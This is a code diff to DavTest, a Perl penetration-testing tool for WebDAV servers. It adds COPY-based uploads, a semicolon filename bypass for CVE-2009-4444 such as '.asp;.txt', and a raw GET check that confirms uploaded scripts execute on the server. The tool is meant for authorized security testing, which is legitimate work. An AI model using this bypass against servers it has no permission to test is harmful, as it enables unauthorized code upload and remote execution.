@@ -15,23 +15,36 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 ########################################################################
+# 1.2 Author: RewardOne (github.com/rewardone)
 # 1.1 Author:	Paulino Calderon (calderon[at]websec[.]mx)
 # 1.0 Author:   Chris Sullo (csullo [at] sunera [.] com)
 #                 http://security.sunera.com/
 #
 # Program Name:		DavTest
 # Purpose:		Perform upload testing of WebDAV enabled servers
-# Version:		1.1
+# Version:		1.2
 # Code Repo:
-# Dependencies: 	HTTP::DAV
+# Dependencies:
+#			HTTP::DAV
+#			HTTP::Request
 #			Getopt::Long
 #
 # CHANGELOG:
+# 1.2 - Added initial MOVE and COPY support. Added bypass testing for CVE-2009-4444
 # 1.1 - Fixed auth and added realm support
+#
+# Known Bugs / Defficiencies:
+# Auth support for bypass raw_exec_check not implemented nor tested
+# Backdoor/Uploadfile functionality using MOVE/COPY bypass not implemented
+#   Workaround: send your request and manually issue MOVE/COPY
+# Running -move and -copy at the same time results in 401 Not Authorized.
+#   Workaround: run modes separately
+#
 ########################################################################
 
 use strict;
 use HTTP::DAV;
+use HTTP::Request;
 use Getopt::Long;
 
 # cli options
@@ -123,7 +136,7 @@ if ($OPTIONS{'createdir'}) {
 
 ###########################################
 # put test files
-if (!$OPTIONS{'move'}) {
+if (!$OPTIONS{'move'} && !$OPTIONS{'copy'}) {
     print "********************************************************\n" unless $OPTIONS{'quiet'};
     print " Sending test files\n"                                      unless $OPTIONS{'quiet'};
     foreach my $type (keys %tests) {
@@ -149,6 +162,8 @@ if ($OPTIONS{'move'}) {
         my $oext    = get_ext($tests{$type}->{'filename'});
         my $txtfile = $tests{$type}->{'filename'};
         $txtfile =~ s/\.$oext$/_$oext\.txt/;
+        my $bypassfile = $tests{$type}->{'filename'};
+        $bypassfile =~ s/\.$oext$/\.$oext\;\.txt/;
 
         if (put_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'content'})) {
             print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n" unless $OPTIONS{'quiet'};
@@ -163,11 +178,82 @@ if ($OPTIONS{'move'}) {
                 $tests{$type}->{'result'} = 1;
                 }
             else {
-                print STDERR "MOVE\t\.$type\tFAIL\n";
+                print STDERR "MOVE\t$type\tFAIL\n";
                 }
             }
         else {
-            print "PUT\t\.$type\tFAIL\n" unless $OPTIONS{'quiet'};
+            print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
+            }
+
+        # I don't know perl, so this is not optimized
+        # PUT the file again in case the last MOVE succeeded (original file would no longer exist)
+        if (put_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'content'})) {
+            #Comment to decrease noise. If first PUT fails, this will too.
+            #print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n" unless $OPTIONS{'quiet'};
+
+            # now move it
+            if (move_file("$OPTIONS{'url'}/$txtfile", $bypassfile)) {
+                print "MOVE\t$type\tSUCCEED:\t$OPTIONS{'url'}/$bypassfile\n"
+                  unless $OPTIONS{'quiet'};
+                $RESULTS{'summary'} .=
+                  "MOVE/PUT File: $OPTIONS{'url'}/$bypassfile\n";
+                $RESULTS{'havesuccess'} = 1;
+                $tests{$type}->{'result'} = 1;
+                }
+            else {
+                print STDERR "MOVE\t$type\tFAIL\t\tWITH BYPASS\n";
+                }
+            }
+        else {
+            #Comment to decrease noise. If first PUT fails, this will too.
+            #print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
+            }
+        }
+    }
+
+###########################################
+# put test files via copy
+if ($OPTIONS{'copy'}) {
+    print "********************************************************\n" unless $OPTIONS{'quiet'};
+    print " Sending test files (COPY method)\n"                        unless $OPTIONS{'quiet'};
+    foreach my $type (keys %tests) {
+        my $oext    = get_ext($tests{$type}->{'filename'});
+        my $txtfile = $tests{$type}->{'filename'};
+        $txtfile =~ s/\.$oext$/_$oext\.txt/;
+        my $bypassfile = $tests{$type}->{'filename'};
+        $bypassfile =~ s/\.$oext$/\.$oext\;\.txt/;
+
+        if (put_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'content'})) {
+            print "PUT\ttxt\tSUCCEED:\t$OPTIONS{'url'}/$txtfile\n" unless $OPTIONS{'quiet'};
+
+            # now copy it
+            if (copy_file("$OPTIONS{'url'}/$txtfile", $tests{$type}->{'filename'})) {
+                print "COPY\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
+                  unless $OPTIONS{'quiet'};
+                $RESULTS{'summary'} .=
+                  "COPY/PUT File: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
+                $RESULTS{'havesuccess'} = 1;
+                $tests{$type}->{'result'} = 1;
+                }
+            else {
+                print STDERR "COPY\t$type\tFAIL\n";
+                }
+
+            # now copy it
+            if (copy_file("$OPTIONS{'url'}/$txtfile", $bypassfile)) {
+                print "COPY\t$type\tSUCCEED:\t$OPTIONS{'url'}/$bypassfile\n"
+                  unless $OPTIONS{'quiet'};
+                $RESULTS{'summary'} .=
+                  "COPY/PUT File: $OPTIONS{'url'}/$bypassfile\n";
+                $RESULTS{'havesuccess'} = 1;
+                $tests{$type}->{'result'} = 1;
+                }
+            else {
+                print STDERR "COPY\t$type\tFAIL\t\tWITH BYPASS\n";
+                }
+            }
+        else {
+            print "PUT\t$type\tFAIL\n" unless $OPTIONS{'quiet'};
             }
         }
     }
@@ -179,6 +265,9 @@ if ($RESULTS{'havesuccess'}) {
     print " Checking for test file execution\n"                        unless $OPTIONS{'quiet'};
     foreach my $type (keys %tests) {
         if ($tests{$type}->{'result'} eq 1) {
+            my $oext    = get_ext($tests{$type}->{'filename'});
+            my $bypassfile = $tests{$type}->{'filename'};
+            $bypassfile =~ s/\.$oext$/\.$oext\;\.txt/;
             if (check_exec("$OPTIONS{'url'}/$tests{$type}->{'filename'}",
                            $tests{$type}->{'execmatch'}
                            )
@@ -187,6 +276,18 @@ if ($RESULTS{'havesuccess'}) {
                 print "EXEC\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
                   unless $OPTIONS{'quiet'};
                 $RESULTS{'summary'} .= "Executes: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
+                }
+            if (check_exec("$OPTIONS{'url'}/$bypassfile",
+                       $tests{$type}->{'execmatch'}
+                       ) ||
+                       raw_check_exec("$OPTIONS{'url'}/$bypassfile",
+                       $tests{$type}->{'execmatch'}
+                       )
+                ) {
+                $tests{$type}->{'execute'} = 1;
+                print "EXEC\t$type\tSUCCEED:\t$OPTIONS{'url'}/$bypassfile\n"
+                  unless $OPTIONS{'quiet'};
+                $RESULTS{'summary'} .= "Executes: $OPTIONS{'url'}/$bypassfile\n";
                 }
             else {
                 $tests{$type}->{'execute'} = 0;
@@ -237,7 +338,7 @@ if ($OPTIONS{'sendbackdoors'} ne '') {
                                     $RESULTS{'backdoors'} = 1;
                                     }
                                 else {
-                                    print STDERR "MOVE\t\.$type\tFAIL\n";
+                                    print STDERR "MOVE\t$type\tFAIL\n";
                                     }
                                 }
 
@@ -280,12 +381,12 @@ if ($OPTIONS{'cleanup'}) {
             # only try if test succeeded
             if ($tests{$type}->{'result'} eq 1) {
                 if (delete_file("$OPTIONS{'url'}/$tests{$type}->{'filename'}")) {
-                    print "DELETE\t\.$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
+                    print "DELETE\t$type\tSUCCEED:\t$OPTIONS{'url'}/$tests{$type}->{'filename'}\n"
                       unless $OPTIONS{'quiet'};
                     $RESULTS{'summary'} .= "DELETED: $OPTIONS{'url'}/$tests{$type}->{'filename'}\n";
                     }
                 else {
-                    print STDERR "DELETE\t\.$type\tFAIL\n";
+                    print STDERR "DELETE\t$type\tFAIL\n";
                     }
                 }
             }
@@ -339,6 +440,14 @@ sub move_file {
     }
 
 ###########################################
+sub copy_file {
+    my $sourcefile = $_[0] || return 0;
+    my $targetfile = $_[1] || return 0;
+    $dav->copy($sourcefile, $targetfile) || return 0;
+    return 1;
+    }
+
+###########################################
 sub get_ext {
     my $file = $_[0] || return;
     $file =~ s/^.*\.//;
@@ -354,6 +463,42 @@ sub check_exec {
     if ($contents =~ /$match/) {
         return 1;
         }
+    return 0;
+    }
+
+###########################################
+#I was only able to test this for the bypass technique
+#Reasoning:
+# The check_exec function uses HTTP::Dav, which sends a PROPFIND
+# request before a GET request. PROPFIND can result in a status
+# 403 response when checking for bypassed files (.asp;.txt). This
+# causes check_exec to never send a GET request and can miss pages
+# that are indeed executable.
+#Not Optimized:
+# raw_check_exec strips HTML tags. When bypassed, the asp page was
+# returning <html><body>49.92 and therefore was not reported as
+# success (match is only on 49.92).
+#No Authentication:
+# Did not spend time adding the headers for auth, but it 'should'
+# be simple.
+sub raw_check_exec {
+    my $url   = $_[0] || return 0;
+    my $match = $_[1] || return 0;
+    my $contents = "";
+    #my $header = stuff here for authenticated DavTests
+    my $request = HTTP::Request->new("GET",$url);
+    my $ua = LWP::UserAgent->new;
+    my $response = $ua->request($request);
+    if ($response->is_success) {
+      my $htmlCode = $response->decoded_content;
+      $htmlCode =~ s|<.+?>||g;
+      if ($htmlCode =~ /$match/) {
+          return 1;
+      }
+    }
+    else {
+        return 0;
+    }
     return 0;
     }
 
@@ -438,6 +583,7 @@ sub usage {
     print " -directory+	postfix portion of directory to create\n";
     print " -debug+	DAV debug level 1-3 (2 & 3 log req/resp to /tmp/perldav_debug.txt)\n";
     print " -move		PUT text files then MOVE to executable\n";
+    print " -copy		PUT text files then COPY to executable\n";
     print " -nocreate 	don't create a directory\n";
     print " -quiet	 	only print out summary\n";
     print " -rand+ 	use this instead of a random string for filenames\n";
@@ -470,6 +616,7 @@ sub parse_options {
                "cleanup"      => \$OPTIONS{'cleanup'},
                "debug=s"      => \$OPTIONS{'debug'},
                "move"         => \$OPTIONS{'move'},
+               "copy"         => \$OPTIONS{'copy'},
                "rand=s"       => \$OPTIONS{'rand'},
                "sendbd=s"     => \$OPTIONS{'sendbackdoors'},
                "uploadfile=s" => \$OPTIONS{'uploadfile'},
@@ -507,4 +654,3 @@ sub parse_options {
     $OPTIONS{'url'}    =~ s/\/$//;
     $OPTIONS{'newdir'} =~ s/\/$//;
     }
-
